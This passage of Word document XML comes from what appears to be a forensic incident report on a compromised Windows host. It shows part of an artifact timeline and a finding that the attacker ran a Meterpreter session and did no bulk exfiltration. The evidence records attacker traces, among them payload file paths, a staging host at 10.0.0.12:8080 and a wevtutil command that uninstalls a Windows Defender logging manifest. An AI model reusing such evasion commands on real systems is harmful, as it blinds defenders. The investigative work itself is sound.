              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:41.058742</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 1 | Microsoft-Windows-Kernel-General | The system time was changed | OldTime: 2023-11-09 19:00:30.0951550 | NewTime: 2023-11-09 11:02:41.0583308 | Reason: An application or system component changed the time.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27708</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.851269</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI modification (M)</w:t>
              <w:br/>
              <w:t>C:\Payloads\pscp.exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#115203</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.603703</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\1.exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#119927</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:21:41.003421</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Payloads\test.exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#109630</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:56:07</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Recycle Bin ($I)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Deletion (moved to Recycle Bin)</w:t>
              <w:br/>
              <w:t>C:\Transcript\20231110\PowerShell_transcript.DESKTOP-KJ81A5A.c4CYCMv_.20231110025534.txt</w:t>
              <w:br/>
              <w:t>size=11303 $I</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>rbcmd/recyclebin_0.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$IX8NRQ1.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:28:22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Recycle Bin ($I)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Deletion (moved to Recycle Bin)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\sysmon-config.xml</w:t>
              <w:br/>
              <w:t>size=0 $I</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>rbcmd/recyclebin_0.csv#3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$IY8CUX9.xml</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:58.244323</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Transcript\20231110\PowerShell_transcript.DESKTOP-KJ81A5A.6HrokibP.20231110030258.txt</w:t>
              <w:br/>
              <w:t>size=950</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#116397</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.869319</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Transcript\20231110\PowerShell_transcript.DESKTOP-KJ81A5A.4_WbZ_YN.20231110030640.txt</w:t>
              <w:br/>
              <w:t>size=12506</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#119921</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:09:10.400596</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Transcript\20231110\PowerShell_transcript.DESKTOP-KJ81A5A._h_Jx2Ns.20231110030910.txt</w:t>
              <w:br/>
              <w:t>size=10284</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#119924</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:52:42.826084</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\system32\wevtutil.exe uninstall-manifest "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.23100.2009-0\Microsoft-Antimalware-AMFilter.man"</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 1088, ProcessGUID: e6e9f951-0b7a-654e-fa00-000000000500 | RuleName: - | MD5=53748B0CD4C78AF5EF1D4E77F3C873AF,SHA256=E16B9D201EC1D7E29B3AD532A9AD8F1AE0CB5821BB916A79F6DBEB1C6E6B85FA,IMPHASH=34BC1195516E78393351B444DF843666 | ParentProcess: C:\Program Fi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18461</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:38:59.162328</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 2 | Microsoft-Windows-Sysmon | A process changed a file creation time | ProcessID: 7024, ProcessGUID: e6e9f951-1652-654e-4302-000000000500 | RuleName: T1099 | Image: C:\Users\medmondson\Downloads\NDP452-KB2901954-Web.exe | TargetFilename: C:\26cf4c312f44da411cfc70a7b86d02\header.bmp | CreationTimeUTC: 2014-02-27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#19971</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.10 Collection, exfiltration and communications</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>I found no collection, staging, compression or bulk exfiltration that can be attributed to the attacker (F-019, medium/probable).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Archives**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- $UsnJrnl and $MFT show these archives created on 2023-11-10:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Sysmon[1].zip in the Edge cache.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - MSEDGE.7z from an Edge update.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - An Appraiser .cab.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - The analyst's own tool archives under Desktop\Tools.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- None was created by an attacker process.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Network connections (Sysmon EID 3)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The only connection tied to the attack is powershell 736 (GUID {e6e9f951-0f56-654e-af01-000000000500}) from 10.0.0.124:50009 to 10.0.0.12:8080/tcp at 11:10:55 UTC, which downloaded 1.exe.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Every other connection belongs to OneDrive, EdgeUpdate, SharePoint or the KAPE tooling.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The Sysmon config does not log network events for pscp.exe or explorer.exe 7324, so the port of the Meterpreter session itself is not recorded.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**SRUM**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- explorer.exe sent 69 KB in the interval ending 11:43, against 3 KB earlier. That fits low-volume C2 traffic, not bulk exfiltration.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- There are no SRUM records for pscp.exe, 1.exe or test.exe.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Other channels checked**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- BITS events 3/59/60: Microsoft jobs only, with no uploads.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Firewall rules 2004–2006 during the attack window: Firefox only.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- OneDrive: self-update only.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- DNS: no external C2 or cloud-storage queries.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Network IOCs**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No new ones. 10.0.0.12 and http://10.0.0.12:8080/ (including /pscp.exe and /1.exe) were already recorded.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-019: No collection/staging or bulk exfiltration evidenced; only attacker network peer is 10.0.0.12:8080 (C2/staging), low-volume outbound from injected explorer.exe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artifact:$usnjrnl:$j</w:t>
              <w:br/>
              <w:t>artifact:srum (network usage per application)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-bits-client%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-powershell%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-windows firewall with advanced security%4firewall.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>exfiltration / command and control</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1041, T1105, T1071.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-10 10:15:00 → 2023-11-10 11:43:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
